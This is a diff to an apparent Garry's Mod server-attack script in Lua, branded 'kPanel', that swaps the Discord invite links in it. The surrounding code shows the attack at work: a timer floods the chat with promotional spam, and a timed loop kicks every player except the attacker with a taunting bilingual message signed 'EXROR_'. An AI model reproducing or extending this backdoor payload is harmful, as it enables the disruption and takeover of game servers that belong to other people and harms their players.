@@ -10,7 +10,7 @@
 
 -- discord.gg/lesheitan <- Le TEMPLE du SHEITAN
 
--- discord.gg/KvM6q2d <- KPanel
+-- https://discord.gg/rQGmWpr <- KPanel
 
 -- Beta2.1 (10-03-2020)
 
@@ -164,7 +164,7 @@ EradiumToClient([=[
 
 -- discord.gg/lesheitan <- Le TEMPLE du SHEITAN
 
--- discord.gg/KvM6q2d <- KPanel
+-- https://discord.gg/rQGmWpr <- KPanel
 
 -- Beta2.1 (10-03-2020)
 
@@ -366,23 +366,23 @@ end
 timer.Create("spamchatbienchiant", 1.5, 0, function()
     local time = tonumber(0)
     local Message = {
-    "K kPanel https://discord.gg/KvM6q2d -",
-    "KK kPanel https://discord.gg/KvM6q2d --",
-    "KKK kPanel https://discord.gg/KvM6q2d ---",
-    "KKKK kPanel https://discord.gg/KvM6q2d ----",
-    "KKKKK kPanel https://discord.gg/KvM6q2d -----",
-    "KKKKKK kPanel https://discord.gg/KvM6q2d ------",
-    "KKKKKKK kPanel https://discord.gg/KvM6q2d -------",
-    "KKKKKKKK kPanel https://discord.gg/KvM6q2d --------",
-    "KKKKKKKKK kPanel https://discord.gg/KvM6q2d ---------",
-    "KKKKKKKK kPanel https://discord.gg/KvM6q2d --------",
-    "KKKKKKK kPanel https://discord.gg/KvM6q2d -------",
-    "KKKKKK kPanel https://discord.gg/KvM6q2d ------",
-    "KKKKK kPanel https://discord.gg/KvM6q2d -----",
-    "KKKK kPanel https://discord.gg/KvM6q2d ----",
-    "KKK kPanel https://discord.gg/KvM6q2d ---",
-    "KK kPanel https://discord.gg/KvM6q2d --",
-    "K kPanel https://discord.gg/KvM6q2d -",
+    "K kPanel https://discord.gg/rQGmWpr -",
+    "KK kPanel https://discord.gg/rQGmWpr --",
+    "KKK kPanel https://discord.gg/rQGmWpr ---",
+    "KKKK kPanel https://discord.gg/rQGmWpr ----",
+    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
+    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
+    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
+    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
+    "KKKKKKKKK kPanel https://discord.gg/rQGmWpr ---------",
+    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
+    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
+    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
+    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
+    "KKKK kPanel https://discord.gg/rQGmWpr ----",
+    "KKK kPanel https://discord.gg/rQGmWpr ---",
+    "KK kPanel https://discord.gg/rQGmWpr --",
+    "K kPanel https://discord.gg/rQGmWpr -",
     }
 
     for _, line in pairs(Message) do
@@ -540,7 +540,7 @@ timer.Simple( 168, function()
 
 for i,v in ipairs(player.GetAll()) do 
 	if v == p then continue end 
-	v:Kick("\n[FR] Oh désolé, je ne me suis pas présenté ,je suis EXROR_ votre serveur a rencontré un problĂ¨me que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nkPanel( https://discord.gg/2PP5z9n )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm EXROR_ your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nCodially kPanel( https://discord.gg/2PP5z9n )") 
+	v:Kick("\n[FR] Oh désolé, je ne me suis pas présenté ,je suis EXROR_ votre serveur a rencontré un problĂ¨me que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nkPanel( https://discord.gg/rQGmWpr )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm EXROR_ your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nCodially kPanel( https://discord.gg/rQGmWpr )") 
 end 
 
 end)
